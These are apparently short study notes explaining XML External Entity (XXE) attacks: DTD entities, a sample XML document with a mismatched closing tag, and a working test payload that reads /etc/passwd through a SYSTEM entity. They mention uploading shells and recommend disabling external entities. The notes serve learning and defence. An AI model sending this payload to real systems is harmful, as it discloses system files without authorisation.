# XXE

XML eXternal Entities attack

- Attacking systems that parse XML input
- Abuse SYSTEM entity and get malicious
- Attacks include DoS. local file disclosure, RCE, and more


XML document
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE gift [
		<!ENTITY from "Alexia">
]>
<gift>
	<To>Frank</To>
	<From>&from;</From>
	<Item>Cards</Cards>
</gift>

```
At the very top, we declare it is an XML doc, version and encoding
Then, we declare a Root element here: gift
children elements (to, from, item)

DOCTYPE is a document type definition - DTD
We declared the from entity within the DTD
Works as a variable and also allows us to include special characters

Google XXE payloads

SYSTEM allows us to pull data from the system

The payload we will test XXE with:
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

When there are file uploads, wecan upload shells, XML documents, etc

Need to completly disable external entities
